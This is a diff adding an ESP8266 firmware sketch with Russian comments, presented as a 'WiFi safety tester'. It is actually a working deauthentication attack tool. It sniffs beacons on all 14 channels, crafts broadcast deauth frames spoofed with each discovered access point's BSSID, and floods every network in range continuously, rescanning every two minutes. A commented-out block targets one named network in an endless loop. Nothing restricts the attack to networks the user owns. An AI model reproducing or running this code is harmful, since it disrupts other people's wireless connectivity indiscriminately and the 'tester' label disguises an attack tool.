@@ -1,1 +1,466 @@
+//универсальный автоматичекский тестировщик сетей WiFi
+#include "ets_sys.h"
+#include "osapi.h"
+#include "gpio.h"
+#include "os_type.h"
+#include "user_config.h"
+#include "user_interface.h"
 
+
+const int size_lim = 50; // максимальное значение количества доступных точек доступа
+const int channel_lim = 14; // количество обслуживаемых каналов
+int kolichestvo = -1; // количество найденных точек доступа
+int longest_essid = 0; // количество BSSID в самом распространенном ESSID
+int set_channel = 1; //номер начального канала
+int channels[channel_lim] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14}; //массив с номерами всех каналов, используется при сканировании
+unsigned long time_ = 0;
+unsigned long deauth_time = 0;
+unsigned long deauth_cycle = 120000;
+
+struct RxControl            //структура, необходимая для сниффинга        
+{
+  signed rssi: 8;
+  unsigned rate: 4;
+  unsigned is_group: 1;
+  unsigned: 1;
+  unsigned sig_mode: 2;
+  unsigned legacy_length: 12;
+  unsigned damatch0: 1;
+  unsigned damatch1: 1;
+  unsigned bssidmatch0: 1;
+  unsigned bssidmatch1: 1;
+  unsigned MCS: 7;
+  unsigned CWB: 1;
+  unsigned HT_length: 16;
+  unsigned Smoothing: 1;
+  unsigned Not_Sounding: 1;
+  unsigned: 1;
+  unsigned Aggregation: 1;
+  unsigned STBC: 2;
+  unsigned FEC_CODING: 1;
+  unsigned SGI: 1;
+  unsigned rxend_state: 8;
+  unsigned ampdu_cnt: 8;
+  unsigned channel: 4;
+  unsigned: 12;
+};
+ 
+struct LenSeq
+{
+  uint16_t length;
+  uint16_t seq;
+  uint8_t address3[6];
+};
+ 
+struct sniffer_buf
+{
+  struct RxControl rx_ctrl;
+  uint8_t buf[36];
+  uint16_t cnt;
+  struct LenSeq lenseq[1];
+};
+ 
+struct sniffer_buf2
+{
+  struct RxControl rx_ctrl;
+  uint8_t buf[112];
+  uint16_t cnt;
+  uint16_t len;
+};
+
+// класс для создания объектов точки доступа
+class AccessPoint
+{
+  public:
+    String essid;
+    signed rssi;
+    uint8_t bssid[6];
+    bool lim_reached = false;
+    bool found = false; // переменная для проверки сканирования дубликата
+    int channel;
+    int packet_limit = 5000;
+    int channels[14] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}; //массив, позволяющий более точно определить, на каком канале работает конкретный ESSID
+
+    uint8_t packet_with_surprize[26] = {                                                        //а вот и сам пакет деаутенфикации
+      /* первые 2 байта */  0xC0, 0x00, //тип и подтип собираемого пакета
+      /* вторая пара байт */ 0x00, 0x00, //esp . сама заполнит данные поля
+      /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,//приемник
+      /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //источник (точка доступа)
+      /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //BSSID (точки доступа)
+      /* 22 - 23 */ 0x00, 0x00, //порядковый номер фрагмента в общении
+      /* 24 - 25 */ 0x01, 0x00 //код причины (1 = неуказанная причина)
+    };
+};
+
+
+
+AccessPoint access_points[size_lim];
+
+// функция вызова снифера
+void ICACHE_FLASH_ATTR promisc_cb(uint8_t *buf, uint16_t len)
+{
+  bool limit_reached = false;
+  bool found = false;
+  bool byte_match;
+  int largest = 0;
+  
+  String local_essid = "";
+  
+  if (len == 12)
+    struct RxControl *sniffer = (struct RxControl*) buf;
+  
+  // длина бекона 
+  else if (len == 128)
+  { 
+    bool beacons = true;
+
+    struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
+
+    if (sniffer->buf[0] == 0x80)
+    {
+      //загружаем BSSID пакета
+      uint8_t byte_arr[6];
+      for (int i = 0; i < 6; i++)
+      {
+        byte_arr[i] = sniffer->buf[i + 10];
+      }
+
+      for (int i = 0; i < sniffer->buf[37]; i++)
+        local_essid.concat((char)sniffer->buf[i + 38]);
+        
+      if (add_access_point(byte_arr, set_channel, local_essid, sniffer->rx_ctrl.rssi))
+      {
+        Serial.print("Beacon -> ");
+
+  
+        // размер бикона хранится в 37 байте
+        // ESSID в беконе начинается с 38 байта
+        for (int i = 0; i < sniffer->buf[37]; i++)
+        {
+          //выводим имя точки доступа
+          Serial.print((char)sniffer->buf[i + 38]);
+        }
+        Serial.print("\n");
+        //print_aps();
+      }
+    }
+
+  }
+
+  //данные
+  else
+  {
+    struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
+    
+    // проверка есть ли у нас уже жта точка доступа
+    for (int i = 0; i < kolichestvo + 1; i++)
+    {
+      byte_match = false;
+
+      //проверка на уникальность BSSID
+      for (int p = 0; p < 6; p++)
+      {
+        if (access_points[i].bssid[p] == sniffer->buf[p + 10])
+          byte_match = true;
+        else
+        {
+          byte_match = false;
+          break;
+        }
+      }
+
+      //проверка значения AP
+      for (int p = 0; p < 6; p++)
+      {
+        if (access_points[i].bssid[p] == sniffer->buf[p + 4])
+          byte_match = true;
+        else
+        {
+          byte_match = false;
+          break;
+        }
+      }
+  
+      // IF WE GET A REPEAT BEACON, UPDATE ITS OBJECT
+      if (byte_match == true)
+      {
+        if (access_points[i].lim_reached == false)
+        {
+          access_points[i].channels[set_channel - 1]++;
+          if (access_points[i].channels[set_channel - 1] >= access_points[i].packet_limit)
+          {
+            access_points[i].lim_reached = true;
+          }
+        }
+      }
+    }
+  }
+}
+
+
+// функция сканирования точек доступа
+void scan()
+{
+  wifi_promiscuous_enable(0);                            //включение режима, позаволяющего делать Sniff эфира
+  wifi_set_promiscuous_rx_cb(promisc_cb);
+  wifi_promiscuous_enable(1);
+  Serial.println("***************Scanning for APs...*****************");
+
+  for (int i = 0; i <= kolichestvo; i++)
+    access_points[i].found = false;
+  
+  for (int i = 0; i < 2; i++)
+  {
+    for (int p = 0; p < channel_lim; p++)
+    {
+      set_channel = channels[p];
+      wifi_set_channel(set_channel);
+
+      delay(1000);
+    }
+    Serial.println("Completed one scan");
+  }
+  Serial.println("Finish scanning");
+  clean_ap_list();
+  wifi_promiscuous_enable(0);           //остановка записи сканирования в promisk_cb
+  wifi_set_promiscuous_rx_cb(0);
+  wifi_promiscuous_enable(1);
+}
+ 
+//функция для вывода на экран списка всех найденных точек доступа 
+void print_aps()
+{
+  
+  Serial.println("-----------------------------");
+
+  
+  for (int i = 0; i < kolichestvo + 1; i++)
+  {
+    for (int x = 0; x < longest_essid - access_points[i].essid.length(); x++)
+      Serial.print(" "); 
+    Serial.print(access_points[i].essid);
+    Serial.print(" -> ");
+    for (int p = 0; p < 6; p++)
+    {
+      Serial.printf("%02x ", access_points[i].bssid[p]);
+    }
+    Serial.print(" | CH: ");
+    Serial.print(access_points[i].channel);
+    Serial.print(" | RSSI: ");
+    Serial.printf("%2d | ", access_points[i].rssi);
+    for (int c = 0; c < 14; c++)
+    {
+      Serial.print(access_points[i].channels[c]);
+      Serial.print(", ");
+    }
+    Serial.print("\n");
+  }
+  Serial.println("-----------------------------");
+}
+
+// функция добавления новых сетей к существующему списку
+bool add_access_point(uint8_t bssid[6], int channel, String essid, signed rssi) //***************************************
+{
+  bool limit_reached = false;
+  bool found = false;
+  bool byte_match;
+  int largest = 0;
+
+  // проверка, имеем ли мы сейчас в массиве данную точку доступа
+  for (int i = 0; i < kolichestvo + 1; i++)
+  {
+    byte_match = false;
+    for (int p = 0; p < 6; p++)
+    {
+      if (access_points[i].bssid[p] == bssid[p])
+        byte_match = true;
+      else
+      {
+        byte_match = false;
+        break;
+      }
+    }
+
+    // если бекон принадлежит сети, которую мы уже видели, то обновим информацию о ней
+    if (byte_match == true)
+    {
+      // помечаем ее как найденную
+      access_points[i].found = true;
+      if (access_points[i].lim_reached == false)
+      {
+        access_points[i].channels[channel - 1]++;
+        if (access_points[i].channels[channel - 1] >= access_points[i].packet_limit)
+        {
+          access_points[i].lim_reached = true;
+        }
+        for (int c = 1; c < 15; c++)                                                      //таким образом находим, на каком канале точка наиболее активна
+        {
+          if (access_points[i].channels[c - 1] >= access_points[i].channels[largest])
+          {
+            largest = c - 1;
+          }
+        }
+        if (access_points[i].channel != largest + 1)
+        {
+          access_points[i].channel = largest + 1;
+          Serial.print(access_points[i].essid);
+          Serial.print(" -> Updated channel: ");
+          Serial.println(access_points[i].channel);
+        }
+      }
+      found = true;
+      break;
+    }
+  }
+
+  //если точки доступа до этого не было тут - добавляем ее
+  if (found == true)
+    return false;
+  else
+  {
+    //добавляем точку доступа
+    kolichestvo++;
+    if (kolichestvo == size_lim)
+      kolichestvo = 0;
+      
+    AccessPoint access_point;
+    access_point.channel = channel;
+    access_point.channels[channel - 1]++;
+    access_point.essid = essid;
+    access_point.rssi = rssi;
+    access_point.found = true;
+    for (int i = 0; i < 6; i++)
+    {
+      access_point.bssid[i] = bssid[i];
+      access_point.packet_with_surprize[i + 10] = bssid[i];
+      access_point.packet_with_surprize[i + 16] = bssid[i];
+    }
+    access_points[kolichestvo] = access_point;
+
+    if (access_point.essid.length() > longest_essid)
+      longest_essid = access_point.essid.length();
+    
+    return true;
+  }
+}
+
+
+// функция вывыода таблички
+void show_table()
+{
+
+  Serial.print("***********************Deauthenticating clients from ");
+  Serial.print(kolichestvo + 1);
+  Serial.println(" access points***********************");
+  Serial.println("-----------------------------");
+  for (int i = 0; i <= kolichestvo; i++)
+  {
+    Serial.print(access_points[i].channel);
+    Serial.print(" | ");
+    Serial.print(access_points[i].essid);
+    Serial.print(" -> ");
+    for (int p = 0; p < 6; p++)
+      Serial.printf("%02x ", access_points[i].packet_with_surprize[p + 10]);
+    Serial.print("\n");
+  }
+  Serial.println("-----------------------------");
+}
+
+//  перемещение мертвой точки доступа в конец массива и 
+void remove_element(int index)
+{
+  AccessPoint temp = access_points[index];
+  Serial.print("!!!!!!!!!Not found in scan | Removing -> ");
+  Serial.println(temp.essid);
+  access_points[index] = access_points[kolichestvo];
+  access_points[kolichestvo] = temp;
+  kolichestvo--;
+  Serial.print("!!!!!!!!!New kolichestvo -> ");
+  Serial.println(kolichestvo);
+}
+
+void clean_ap_list()      //очистка массива точек доступа, найденных припрошлой итерации
+{
+  Serial.println("Cleaning AP list...");
+  for (int i = 0; i <= kolichestvo; i++)
+  {
+    if (access_points[i].found == false)
+      remove_element(i);
+  }
+}
+
+void setup() {                                            //функция начальной настройки esp и вызов сканирования эфира
+  delay(2000);
+  
+  Serial.begin(2000000);                            //скорость передачи дынных на выходной порт
+  Serial.println("starting super ULTIMATE WiFi safety tester");
+  Serial.println("Initializing...\n\n");
+  wifi_set_opmode(0x1);
+  wifi_set_channel(set_channel);
+  Serial.println("Init finished\n\n");
+  time_ = millis();
+
+  //сканирование
+  scan();
+  deauth_time = millis();
+  Serial.print("kolichestvo time -> ");
+  Serial.print(deauth_time);
+  Serial.println("ms");
+
+  show_table();
+}
+
+
+void send_surprize(AccessPoint access_point) //отправка фреймов деаунтефикации
+{
+  int n = wifi_set_channel(access_point.channel);  //установка канала WiFi модуля
+  Serial.print("я сейчас на канале номер ");
+  Serial.println(access_point.channel);
+  delay(10);
+  for (int h = 0; h < 26; ++h)
+  {
+    Serial.printf("%02x:", access_point.packet_with_surprize[h]);                              
+  }
+  Serial.println();
+  for (int t = 0; t < 144; t++) {
+    wifi_send_pkt_freedom(access_point.packet_with_surprize, 26, 0); 
+  }
+ /* if (access_point.essid == "RT-2.4GHz_WiFi_EA3C") {
+   Serial.println("поооооогнаааали");
+    for (int t = 0; t < 144; t = t + 1 - 1) {
+    do{ yield(); } while(0);
+     Serial.println("поооооогнаааали  точно");
+    wifi_send_pkt_freedom(access_point.packet_with_surprize, 26, 0); 
+  }
+} */
+}
+
+// главный цикл прохождения по каналам
+void loop(){
+
+  if (millis() - deauth_time > deauth_cycle)        //millis возвращает количество миллисекунд с момента начала программы
+  {
+    Serial.print("Deauth ");
+    Serial.print(deauth_cycle);
+    Serial.println("ms mark");
+    scan();
+    show_table();
+    deauth_time = millis();
+  }
+  for (int i = 0; i <= kolichestvo; i++)
+  {
+    Serial.print("sending packets to ->");
+    Serial.println(access_points[i].essid);
+    Serial.println(". was using packet:");
+    for (int g = 10; g <= 15; g++)
+    {
+    Serial.print(access_points[i].packet_with_surprize[g]);
+    Serial.print(":");
+    }
+    Serial.println();
+    send_surprize(access_points[i]);
+    //Serial.println("Точка атакована");
+  }
+  delay(1);
+
+}
